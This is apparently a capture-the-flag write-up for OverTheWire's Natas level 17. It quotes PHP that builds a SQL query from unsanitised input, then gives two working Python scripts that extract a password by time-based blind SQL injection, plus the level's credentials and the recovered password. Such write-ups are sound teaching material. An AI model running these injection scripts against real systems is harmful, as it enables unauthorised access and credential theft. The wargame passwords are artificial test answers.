# Solution
```php
<?php  
  
/*  
CREATE TABLE `users` (  
  `username` varchar(64) DEFAULT NULL,  
  `password` varchar(64) DEFAULT NULL  
);  
*/  
  
if(array_key_exists("username", $_REQUEST)) {    $link = mysqli_connect('localhost', 'natas17', '<censored>');    mysqli_select_db($link, 'natas17');    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";  
    if(array_key_exists("debug", $_GET)) {  
        echo "Executing query: $query<br>";  
    }    $res = mysqli_query($link, $query);  
    if($res) {  
    if(mysqli_num_rows($res) > 0) {        //echo "This user exists.<br>";    } else {        //echo "This user doesn't exist.<br>";    }  
    } else {        //echo "Error in query.<br>";    }    mysqli_close($link);  
} else {  
?>
```

The server script suggests that we are dealing with blind slqi attack instead of conditional.

To perform a blind attack, we can use time-based attack with either the like or the substring keyword.

#### Substring
```python
import requests
import time
import string

url = "http://natas17.natas.labs.overthewire.org"
auth = ("natas17", "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")  # Replace if needed
charset = string.ascii_letters + string.digits
password = ""

for i in range(1, 33):  # Password length is 32
    for c in charset:
        payload = (
            f'natas18" AND IF(BINARY (SELECT SUBSTRING(password,{i},1) '
            f'FROM users WHERE username="natas18")="{c}", SLEEP(3), 0)-- -'
        )
        start = time.time()
        response = requests.get(url, auth=auth, params={"username": payload})
        elapsed = time.time() - start

        if elapsed > 2.5:
            password += c
            print(f"[{i}/32] {password}")
            break

print(f"Recovered password: {password}")
```

#### Like
```python
import string
import time
import requests

url = "http://natas17.natas.labs.overthewire.org"
auth = ("natas17", "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")
charset = string.ascii_letters + string.digits
known = ""

while len(known) < 32:
    for c in charset:
        test = known + c
        injection = f'natas18" AND password LIKE BINARY "{test}%" AND SLEEP(5)-- -'
        params = {"username": injection}
        
        start = time.time()
        response = requests.get(url, auth=auth, params=params)
        elapsed = time.time() - start

        if elapsed >= 5:
            known += c
            print(f"[{len(known)}/32] {known}")
            break
```

```
6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
```